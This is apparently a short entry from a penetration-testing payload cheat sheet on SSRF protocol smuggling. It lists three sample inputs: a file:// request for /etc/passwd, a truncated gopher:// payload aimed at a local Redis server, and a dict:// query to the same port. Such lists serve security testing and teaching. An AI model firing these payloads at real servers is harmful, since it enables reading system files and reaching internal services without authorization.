# Protocol Smuggling

## Summary
Use alternative protocols via SSRF.

## Payloads
```
file:///etc/passwd
gopher://localhost:6379/_*2%0d%0a... (Redis)
dict://localhost:6379/info
```
